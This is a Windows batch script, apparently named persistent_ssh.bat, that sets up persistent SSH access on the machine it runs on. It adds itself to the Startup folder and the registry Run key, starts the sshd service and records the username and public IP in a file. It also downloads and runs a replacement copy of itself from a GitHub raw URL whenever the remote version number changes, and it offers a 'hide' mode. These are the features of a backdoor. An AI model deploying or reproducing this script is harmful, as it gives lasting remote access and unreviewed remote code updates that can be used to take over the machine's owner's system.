@echo off
setlocal enabledelayedexpansion

:: ===================== CONFIGURATION =====================
set "SCRIPT_NAME=persistent_ssh.bat"
set "GITHUB_USER=1inam1llion"
set "GITHUB_REPO=battunnel"
set "VERSION_FILE_RAW=https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/version.txt"

:: Startup and Registry paths
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "STARTUP_PATH=%STARTUP_FOLDER%/%SCRIPT_NAME%"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=PersistentSSH"

:: Log files
set "DEBUG_LOG=%APPDATA%\persistent_ssh_debug.log"
set "CONN_INFO_FILE=%APPDATA%\persistent_ssh_connection_info.txt"
set "LOCAL_VERSION_FILE=%APPDATA%\persistent_ssh_version.txt"

:: ===================== ENSURE LOG FILES EXIST =====================
if not exist "%DEBUG_LOG%" echo [INFO] Log file created. > "%DEBUG_LOG%"
if not exist "%CONN_INFO_FILE%" echo [INFO] SSH connection info will be stored here. > "%CONN_INFO_FILE%"
if not exist "%LOCAL_VERSION_FILE%" echo 0.0 > "%LOCAL_VERSION_FILE%"

:: ===================== DISPLAY STARTUP INFO =====================
echo [INFO] Starting SSH persistence script...
echo [%DATE% %TIME%] [INFO] Script started. >> "%DEBUG_LOG%"

:: ===================== REMOVE OLD STARTUP ENTRIES =====================
if exist "%STARTUP_PATH%" (
    del /F /Q "%STARTUP_PATH%"
    echo [%DATE% %TIME%] [INFO] Removed old startup script. >> "%DEBUG_LOG%"
)
reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1
echo [%DATE% %TIME%] [INFO] Removed old registry entry. >> "%DEBUG_LOG%"

:: ===================== ADD TO STARTUP FOLDER =====================
copy "%~f0" "%STARTUP_PATH%" >nul
echo [%DATE% %TIME%] [INFO] Added script to startup folder. >> "%DEBUG_LOG%"

:: ===================== ADD TO REGISTRY =====================
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "%STARTUP_PATH%" /f >nul
echo [%DATE% %TIME%] [INFO] Added registry startup key. >> "%DEBUG_LOG%"

:: ===================== CHECK IF SSH SERVER IS RUNNING =====================
sc query sshd | find "RUNNING" >nul
if %errorlevel% neq 0 (
    echo [ERROR] SSH Server is NOT running! Attempting to start...
    net start sshd
    if %errorlevel% neq 0 (
        echo [FATAL] Failed to start SSH server. >> "%DEBUG_LOG%"
        echo [FATAL] Check OpenSSH installation.
        exit /b
    )
    echo [INFO] SSH Server started successfully. >> "%DEBUG_LOG%"
) else (
    echo [INFO] SSH Server is already running. >> "%DEBUG_LOG%"
)

:: ===================== GET CONNECTION DETAILS =====================
:: Retrieve public IP using a reliable service
curl -s https://api.ipify.org > "%TEMP%\public_ip.txt"
set /p PUBLIC_IP=<"%TEMP%\public_ip.txt"
set "USERNAME=%USERNAME%"

:: Write connection details to file
echo [INFO] Writing connection details to %CONN_INFO_FILE%
(
    echo SSH Connection Information:
    echo Username: %USERNAME%
    echo Public IPv4: %PUBLIC_IP%
    echo Port: 22
    echo Note: Ensure SSH is configured for password or key-based authentication.
) > "%CONN_INFO_FILE%"

:: ===================== CHECK GITHUB FOR UPDATES =====================
echo [INFO] Checking for updates...
curl -s "%VERSION_FILE_RAW%" > "%TEMP%\github_version.txt"
set /p GITHUB_VERSION=<"%TEMP%\github_version.txt"
set /p LOCAL_VERSION=<"%LOCAL_VERSION_FILE%"

echo [INFO] Local Version: %LOCAL_VERSION%
echo [INFO] GitHub Version: %GITHUB_VERSION%

if "%LOCAL_VERSION%" NEQ "%GITHUB_VERSION%" (
    echo [UPDATE] New version found! Updating...
    
    :: Download new version to a temporary location
    curl -s -o "%TEMP%\%SCRIPT_NAME%" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%SCRIPT_NAME%"
    
    :: Create a helper script to replace and restart after exit
    (
        echo @echo off
        echo timeout /t 2 /nobreak ^>nul
        echo copy /Y "%TEMP%\%SCRIPT_NAME%" "%STARTUP_PATH%"
        echo start "" "%STARTUP_PATH%"
    ) > "%TEMP%\update_helper.bat"
    
    :: Update local version file and start helper
    echo %GITHUB_VERSION% > "%LOCAL_VERSION_FILE%"
    start "" "%TEMP%\update_helper.bat"
    exit
) else (
    echo [INFO] No updates found. Running latest version. >> "%DEBUG_LOG%"
)

:: ===================== HIDDEN MODE TRIGGER =====================
:input
set /p command=Enter Command:
if "%command%"=="hide" (
    echo [INFO] Relaunching in hidden mode...
    start /min "" "%~f0"
    exit
)
goto input
